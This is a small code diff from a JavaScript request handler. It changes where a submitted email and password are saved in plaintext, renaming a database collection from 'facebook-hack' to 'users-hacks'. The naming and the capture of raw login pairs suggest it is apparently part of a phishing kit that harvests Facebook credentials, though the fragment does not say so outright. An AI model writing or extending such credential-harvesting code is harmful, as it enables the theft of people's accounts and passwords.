@@ -12,7 +12,7 @@ const handler = async (req, res) => {
 
     try {
 
-      await req.db('facebook-hack').collection('users').insertOne({ email, password })
+      await req.db.collection('users-hacks').insertOne({ email, password })
 
     } catch (error) {
       console.log(error)
